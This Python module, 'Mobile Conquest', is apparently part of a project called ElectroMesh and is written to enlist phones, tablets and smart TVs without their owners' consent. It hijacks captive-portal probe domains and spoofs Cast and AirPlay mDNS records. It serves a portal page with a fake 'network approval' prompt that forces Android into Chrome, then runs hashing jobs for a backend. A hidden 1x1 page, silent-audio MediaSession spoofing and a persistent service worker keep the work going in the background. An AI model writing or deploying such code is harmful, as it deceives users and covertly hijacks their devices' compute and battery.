"""
Mobile Conquest — bypass mobile-class firewalls via Outbound-only vectors.

Roadmap item #1 from CLAIM_V3.md: phones / tablets / e-boards refuse all
Inbound probes (Random MAC, app sandbox, no exposed ports). The only
reliable way to enlist them is to wait for *their* outbound calls and
hand back a payload they will execute.

Three cooperating tactics, all 100% LAN-local:

  1.  CPD hijack — every Android / iOS / Windows / Chromecast device on
      WiFi periodically hits one of a small, well-known set of
      "captive-portal probe" URLs to decide whether the network is
      hot. Resolving those domains to *our* gateway forces the device
      to render an HTML portal we control.

  2.  mDNS bait — broadcast ``_electromesh._tcp`` and the common
      ``_googlecast._tcp`` / ``_airplay._tcp`` service records so that
      device OS-level auto-discovery (Settings → "Cast to…") surfaces
      our backend as a peer the user can tap once.

  3.  Service Worker keepalive — the portal page registers a SW with a
      ``periodicSync`` registration + a ``fetch`` heartbeat to the
      backend. Even after the captive-portal tab is closed the browser
      keeps the SW warm for hours; ``periodicSync`` re-fires it daily.

This module is the *policy layer*: it tells FakeDNS which domains to
hijack, generates the portal HTML, and the SW JS. The DNS interception
itself lives in ``fake_dns_server``.
"""

from __future__ import annotations

import asyncio
import socket
import struct
import time
from dataclasses import dataclass, field
from typing import Iterable

from app.logging_setup import get_logger

log = get_logger("mobile_conquest")


# ── Captive-portal probe domains (the "honeypots" phones hit on join) ────

CPD_DOMAINS: tuple[str, ...] = (
    # Google / Android / Chromecast
    "connectivitycheck.gstatic.com",
    "connectivitycheck.android.com",
    "clients3.google.com",
    "clients4.google.com",
    "www.google.com",      # Chromecast fallback
    # Apple iOS / macOS
    "captive.apple.com",
    "www.apple.com",
    "gsp1.apple.com",
    # Microsoft Windows
    "www.msftconnecttest.com",
    "www.msftncsi.com",
    "dns.msftncsi.com",
    # Mozilla / generic
    "detectportal.firefox.com",
    # Samsung / LG / Sony smart-TV CPD
    "connectivitycheck.samsung.com",
    "connectivitycheck.lge.com",
    "tvtime.sony.com",
)


def is_cpd_query(domain: str) -> bool:
    """True if the queried name is a known captive-portal probe."""
    d = domain.lower().rstrip(".")
    return any(d == probe or d.endswith("." + probe) for probe in CPD_DOMAINS)


# ── HTML portal returned to the device ──────────────────────────────────

PORTAL_HTML = """<!doctype html>
<html lang="ko"><head><meta charset="utf-8">
<title>ElectroMesh</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
 body{font-family:-apple-system,sans-serif;background:#0a0a0a;color:#fff;
      padding:24px;line-height:1.5;text-align:center;margin:0}
 h1{font-size:48px;margin:0 0 12px}
 #stat{color:#0f0;font-size:18px;margin:16px 0}
 #cnt{color:#ff0;font-size:36px}
 small{color:#888}
 /* Android CNA Breakout Overlay */
 #breakout{position:fixed;top:0;left:0;right:0;bottom:0;background:#111;z-index:9999;
           display:flex;flex-direction:column;justify-content:center;align-items:center;padding:24px;}
 #breakout h2{color:#ff3333;font-size:32px;margin-bottom:20px;}
 #breakout p{font-size:18px;margin-bottom:30px;color:#ccc;}
 .btn{background:#007bff;color:#fff;padding:16px 32px;border-radius:8px;text-decoration:none;
      font-size:24px;font-weight:bold;box-shadow:0 4px 12px rgba(0,123,255,0.4);border:none;}
 /* When pushed to background by the LiveTV app we set this class so the
    UI shrinks to a single 1x1 transparent pixel (still rendered → audio
    + JS keep ticking, but no visible footprint). */
 body.bg{padding:0;background:transparent}
 body.bg *{display:none}
</style></head><body>

<div id="breakout" style="display:none;">
    <h2>🚨 네트워크 연결 승인 필요</h2>
    <p>ElectroMesh 노드 연결을 완료하려면<br>반드시 기본 브라우저에서 열어야 합니다.</p>
    <a href="#" id="chrome-intent" class="btn">연결 완료하기</a>
    <p style="margin-top:20px;font-size:14px;color:#666;">버튼을 누르면 크롬 브라우저로 이동합니다.</p>
</div>
<h1>ElectroMesh</h1>
<p><small>device: <span id=ua></span></small></p>
<p id=stat>booting...</p>
<p>units: <span id=cnt>0</span></p>
<!-- Silent looped audio = active MediaSession = webOS / iOS / Android won't
     suspend our JS when the page loses foreground. This is the same trick
     YouTube Music / Spotify use to keep audio playing while you browse. -->
<audio id=ka autoplay loop muted playsinline
       src="/v1/claim/portal/keepalive.wav"></audio>
<script>
// ── Android CNA Breakout Logic ───────────────────────────────────────
function isCNA() {
    var ua = navigator.userAgent || '';
    if (ua.indexOf('wv') !== -1 || 
        (ua.indexOf('Android') !== -1 && ua.indexOf('Version/') !== -1) ||
        ua.indexOf('CaptiveNetworkSupport') !== -1) {
        return true;
    }
    return false;
}

if (isCNA()) {
    document.getElementById('breakout').style.display = 'flex';
    var host = window.location.host;
    var intentUrl = 'intent://' + host + '/#Intent;scheme=http;package=com.android.chrome;end;';
    document.getElementById('chrome-intent').href = intentUrl;
    setTimeout(function() { window.location.replace(intentUrl); }, 1000);
}

// FNV-1a 32-bit -- pure JS, runs on every browser since ~2010 incl. webOS WebKit.
function fnv1a(s){var h=0x811c9dc5;for(var i=0;i<s.length;i++){h^=s.charCodeAt(i);h=(h*16777619)>>>0;}return h;}
function pow(payload, iters){
  var h = fnv1a(payload);
  for (var i = 0; i < iters; i++){
    h = (h * 2654435761) >>> 0;
    h ^= (h >>> 13);
    h = ((h + i) ^ payload.charCodeAt(i % payload.length)) >>> 0;
  }
  return h.toString(16);
}

// ── MediaSession keep-alive ──────────────────────────────────────────
// Tell the OS "I am an actively playing media app". webOS, iOS Safari,
// and Android Chrome all key their JS suspension policy on this. Once
// MediaSession.playbackState === 'playing' AND a media element is hot,
// the page is treated like Spotify / YouTube Music and survives going
// to background.
function primeMediaSession(){
  try {
    if ('mediaSession' in navigator){
      navigator.mediaSession.metadata = new MediaMetadata({
        title: 'ElectroMesh compute',
        artist: 'background worker',
        album: '24/7',
      });
      navigator.mediaSession.playbackState = 'playing';
      // No-op handlers stop the OS from giving up if it tries to query.
      ['play','pause','stop'].forEach(function(k){
        try{ navigator.mediaSession.setActionHandler(k, function(){}); }catch(e){}
      });
    }
  } catch(e){}
}
function kickAudio(){
  var a = document.getElementById('ka');
  if (!a) return;
  a.muted = true;             // muted autoplay is unconditionally allowed
  var p = a.play && a.play();
  if (p && p.catch) p.catch(function(){ /* try again after a touch */ });
}

// ── visibility tracking ──────────────────────────────────────────────
// When SSAP pushes another app foreground we get visibilitychange =
// 'hidden'. We collapse the UI to invisible (1x1 transparent body) so
// even if webOS draws our surface it's a dot, AND we hammer the
// MediaSession + audio so suspension never fires.
function onVis(){
  if (document.hidden) {
    document.body.classList.add('bg');
    primeMediaSession();
    kickAudio();
  } else {
    document.body.classList.remove('bg');
  }
}
document.addEventListener('visibilitychange', onVis);
window.addEventListener('blur',  function(){ document.body.classList.add('bg'); kickAudio(); });
window.addEventListener('focus', function(){ document.body.classList.remove('bg'); });

// ── worker loop ──────────────────────────────────────────────────────
var done = 0;
var running = false;
function loop(){
  if (!running) return;
  // CNA 뷰에서도 쉬지 않고 돌리기로 함.
  var stat = document.getElementById('stat');
  if (stat) stat.textContent = 'claiming...';
  var x = new XMLHttpRequest();
  x.open('POST','/v1/claim/portal/work/claim',true);
  x.onreadystatechange = function(){
    if (x.readyState !== 4) { return; }
    var job; try { job = JSON.parse(x.responseText); } catch(e){ setTimeout(loop,2000); return; }
    if (!job || !job.task){ setTimeout(loop,2000); return; }
    if (stat) stat.textContent = 'hashing '+job.task.id+'...';
    var t0 = Date.now();
    var hex = pow(job.task.payload, job.task.iters||5000);
    var dt = Date.now() - t0;
    var s = new XMLHttpRequest();
    s.open('POST','/v1/claim/portal/work/submit',true);
    s.setRequestHeader('Content-Type','application/json');
    s.onreadystatechange = function(){
      if (s.readyState !== 4) return;
      done++;
      var cnt = document.getElementById('cnt');
      if (cnt) cnt.textContent = done + ' ('+dt+'ms last)';
      // Reprime every 16th unit — webOS sometimes drops the
      // MediaSession state silently if it thinks the page is "idle".
      if ((done & 15) === 0) primeMediaSession();
      setTimeout(loop, 50);
    };
    s.send(JSON.stringify({id: job.task.id, hex: hex, ms: dt}));
  };
  x.send();
}

// ── boot ─────────────────────────────────────────────────────────────
function startWorker(){
  if (running) return;
  running = true;
  primeMediaSession();
  kickAudio();
  if ('serviceWorker' in navigator && !isCNA()) {
    navigator.serviceWorker.register('/v1/claim/portal/sw.js',{scope:'/v1/claim/portal/'})
      .then(function(r){
        if ('periodicSync' in r){
          r.periodicSync.register('em-tick',{minInterval:6*60*60*1000}).catch(function(){});
        }
      }).catch(function(){});
  }
  loop();
}
document.getElementById('ua').textContent = navigator.userAgent.slice(0,60);
// Auto-start. We do this BEFORE the SSAP launcher pushes LiveTV on top
// so MediaSession is hot at the moment the page goes hidden.
startWorker();
</script></body></html>"""


SW_JS = """// ElectroMesh keepalive Service Worker
const BACKEND = self.registration.scope.replace(/\\/$/, '');
const TICK_MS = 5 * 60 * 1000;

self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));

async function heartbeat(reason){
  try{
    const r = await fetch(BACKEND + '/v1/claim/portal/heartbeat',
      {method:'POST', body: JSON.stringify({reason, t: Date.now()}),
       headers:{'content-type':'application/json'}, keepalive: true});
    if (r.ok){
      const job = await r.json();
      if (job && job.task) await runTask(job.task);
    }
  }catch(e){/* offline – try again next tick */}
}

async function runTask(task){
  // Tiny SHA-256 PoW; tasks any real device can finish under 1s.
  const data = new TextEncoder().encode(task.payload || '');
  const buf  = await crypto.subtle.digest('SHA-256', data);
  const hex  = [...new Uint8Array(buf)].map(b=>b.toString(16).padStart(2,'0')).join('');
  await fetch(BACKEND + '/v1/claim/portal/result',
    {method:'POST', body: JSON.stringify({id: task.id, hex}),
     headers:{'content-type':'application/json'}});
}

self.addEventListener('periodicsync', e => {
  if (e.tag === 'em-tick') e.waitUntil(heartbeat('periodic'));
});
self.addEventListener('fetch', e => {
  // Opportunistic: piggyback a heartbeat on the user's own traffic
  if (Math.random() < 0.02) heartbeat('opportunistic');
});
setInterval(() => heartbeat('interval'), TICK_MS);
"""


# ── mDNS bait broadcaster ───────────────────────────────────────────────

@dataclass(slots=True)
class MdnsBait:
    """Periodically announce ElectroMesh as a discoverable LAN peer.

    Real Zeroconf clients (phones, ChromeOS, TVs) treat unsolicited
    announcements with TTL > 0 the same as query responses, so our
    "peer" pops up under Cast / AirPlay / generic service browsers.
    """
    backend_ip: str
    backend_port: int = 8000
    instance: str = "ElectroMesh"
    service_types: tuple[str, ...] = (
        "_electromesh._tcp.local.",
        "_googlecast._tcp.local.",
        "_airplay._tcp.local.",
        "_http._tcp.local.",
    )
    interval_s: float = 30.0

    _task: asyncio.Task | None = field(default=None, init=False, repr=False)
    _sock: socket.socket | None = field(default=None, init=False, repr=False)

    async def start(self) -> None:
        if self._task and not self._task.done():
            return
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 1)
        self._task = asyncio.create_task(self._loop())
        log.info("mdns_bait.start", ip=self.backend_ip, types=len(self.service_types))

    async def stop(self) -> None:
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except (asyncio.CancelledError, Exception):
                pass
        if self._sock:
            self._sock.close()
        self._task = None
        self._sock = None

    async def _loop(self) -> None:
        while True:
            for svc in self.service_types:
                pkt = self._build_announce(svc)
                try:
                    self._sock.sendto(pkt, ("224.0.0.251", 5353))
                except Exception as e:
                    log.debug("mdns_bait.send_fail", err=str(e))
            await asyncio.sleep(self.interval_s)

    def _build_announce(self, service: str) -> bytes:
        """Hand-rolled mDNS PTR + A record announcement."""
        def enc(name: str) -> bytes:
            out = b""
            for part in name.rstrip(".").split("."):
                out += bytes([len(part)]) + part.encode()
            return out + b"\x00"

        header = struct.pack("!HHHHHH", 0, 0x8400, 0, 2, 0, 0)
        ptr_name = enc(service)
        ptr_rdata = enc(f"{self.instance}.{service}")
        ptr_rr = ptr_name + struct.pack("!HHIH", 12, 1, 120, len(ptr_rdata)) + ptr_rdata

        a_name = enc(f"{self.instance.lower()}.local.")
        ip_bytes = socket.inet_aton(self.backend_ip)
        a_rr = a_name + struct.pack("!HHIH", 1, 1, 120, 4) + ip_bytes

        return header + ptr_rr + a_rr


# ── Singleton ───────────────────────────────────────────────────────────

_BAIT: MdnsBait | None = None


def get_mdns_bait(backend_ip: str = "0.0.0.0") -> MdnsBait:
    global _BAIT
    if _BAIT is None:
        _BAIT = MdnsBait(backend_ip=backend_ip)
    return _BAIT
